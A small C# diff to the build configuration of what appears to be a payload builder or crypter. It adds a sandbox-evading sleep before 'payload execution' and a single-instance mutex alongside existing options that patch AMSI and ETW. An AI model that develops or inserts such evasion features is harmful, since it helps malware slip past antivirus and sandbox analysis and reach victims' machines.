@@ -15,5 +15,9 @@ public class BuildConfig
     public EvasionOptions Evasion { get; set; } = EvasionOptions.PatchAMSI | EvasionOptions.PatchETW;
     public string StubProjectPath { get; set; } = "";
     public bool OutputBat { get; set; }
+    /// <summary>Seconds to sleep before payload execution (0 = no delay). Evades sandbox timeouts.</summary>
+    public int DelaySeconds { get; set; }
+    /// <summary>Mutex name for single-instance (empty = no mutex).</summary>
+    public string MutexName { get; set; } = "";
 }
 }
